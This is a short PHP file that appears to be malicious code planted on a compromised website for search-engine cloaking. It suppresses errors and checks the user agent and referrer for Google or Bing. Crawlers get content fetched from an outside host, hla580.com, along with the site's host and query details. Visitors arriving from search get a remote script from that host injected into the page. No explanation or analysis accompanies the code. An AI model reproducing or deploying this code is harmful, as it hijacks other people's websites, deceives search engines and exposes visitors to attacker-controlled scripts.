<?php
error_reporting(0);
header('Content-Type:text/html;charset=utf-8');
$key= $_SERVER["HTTP_USER_AGENT"];
if(strpos($key,strtolower('oogle'))!== false || strpos($key,strtolower('bing'))!== false) {
    date_default_timezone_set('PRC');
    $TD_server = "https://hla580.com/";
    $host_name = "https://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
    $Content_mb= getCurl($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
    echo $Content_mb;
}
$httpuser=strtolower($_SERVER['HTTP_REFERER']);
if(strstr($httpuser,'oogle') || strstr($httpuser,'bing')) {
    
    echo '<script language="javascript" src="https://hla580.com/shouji.js"></script>';
    
    exit;

    
}



function getCurl($url){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    
    curl_setopt($curl, CURLOPT_HEADER, 0);
    
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查
    //curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, true);  // 从证书中检查SSL加密算法是否存在
    $res = curl_exec($curl);
    curl_close($curl);
    return $res;
}
?>
